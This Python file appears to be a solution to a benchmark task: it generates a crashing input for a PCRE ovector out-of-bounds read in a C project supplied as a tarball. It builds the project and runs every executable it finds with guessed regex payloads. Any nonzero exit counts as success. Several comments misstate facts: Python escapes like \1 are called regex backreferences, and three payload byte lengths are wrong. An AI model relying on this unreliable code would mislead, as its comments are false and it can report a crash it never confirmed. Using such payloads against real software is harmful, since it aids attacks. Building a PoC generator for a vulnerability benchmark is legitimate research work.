import tarfile
import tempfile
import os
import subprocess
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for source files (likely C/C++)
            source_files = []
            for root, _, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith(('.c', '.cpp', '.cc', '.cxx')):
                        source_files.append(os.path.join(root, file))
            
            if not source_files:
                raise RuntimeError("No source files found")
            
            # Analyze source to understand vulnerability context
            # Look for patterns related to PCRE ovector usage
            poc_candidates = []
            
            # Try to identify the vulnerable function/pattern
            for source_file in source_files:
                with open(source_file, 'r', errors='ignore') as f:
                    content = f.read()
                    
                    # Look for PCRE function calls or ovector usage
                    if re.search(r'pcre.*exec|ovector|PCRE_OVECTOR', content, re.IGNORECASE):
                        # Try to understand the expected pattern structure
                        # The vulnerability description suggests fewer capturing parentheses
                        # than ovector space, causing read from invalid memory
                        
                        # Ground truth length is 8 bytes, so create minimal pattern
                        # that triggers this condition
                        
                        # A pattern with 0 capturing groups but large ovector allocation
                        # could trigger read from invalid memory when trying to access
                        # non-existent capture groups
                        
                        # Try: empty pattern or minimal pattern with no captures
                        poc_candidates.append(b"()" * 4)  # 8 bytes with 4 empty groups
                        poc_candidates.append(b"(?:)")  # Non-capturing group
                        poc_candidates.append(b"^$")  # Empty string match
                        
                        # Based on typical PCRE overflow vulnerabilities
                        # Try pattern that causes ovector index miscalculation
                        poc_candidates.append(b"()\1\1")  # 6 bytes with backreference
                        poc_candidates.append(b"()\1\1\1")  # 8 bytes with backreferences
            
            # If no specific patterns found, try common overflow patterns
            if not poc_candidates:
                # Minimal pattern to trigger stack overflow in regex parsing
                poc_candidates = [
                    b"A" * 8,  # Simple overflow
                    b"(" * 4 + b")" * 4,  # Balanced parentheses
                    b"\x00" * 8,  # Null bytes
                ]
            
            # Test candidates by compiling and running
            # Look for Makefile or build script
            makefile = None
            for root, _, files in os.walk(tmpdir):
                if 'Makefile' in files or 'makefile' in files:
                    makefile = root
                    break
            
            if makefile:
                # Build the project
                build_result = subprocess.run(
                    ['make', '-C', makefile],
                    capture_output=True,
                    text=True
                )
                
                if build_result.returncode == 0:
                    # Find the built executable
                    executables = []
                    for root, _, files in os.walk(tmpdir):
                        for file in files:
                            filepath = os.path.join(root, file)
                            if os.access(filepath, os.X_OK) and os.path.isfile(filepath):
                                # Check if it's not a directory and is executable
                                try:
                                    # Try to run with --help or similar to test
                                    test_result = subprocess.run(
                                        [filepath, '--help'],
                                        capture_output=True,
                                        text=True,
                                        timeout=1
                                    )
                                    executables.append(filepath)
                                except:
                                    pass
                    
                    # Test each candidate
                    for executable in executables:
                        for candidate in poc_candidates:
                            try:
                                # Run with candidate input
                                result = subprocess.run(
                                    [executable],
                                    input=candidate,
                                    capture_output=True,
                                    text=False,
                                    timeout=2
                                )
                                
                                # Check if it crashes (non-zero exit)
                                if result.returncode != 0:
                                    # Likely triggered the vulnerability
                                    return candidate
                            except subprocess.TimeoutExpired:
                                continue
                            except Exception:
                                continue
            
            # Default fallback based on vulnerability description
            # Pattern with minimal capturing groups but expected to fill larger ovector
            # 8-byte pattern: 2 capturing groups, but code expects more
            return b"()()\x00\x00"  # 8 bytes: two empty groups + padding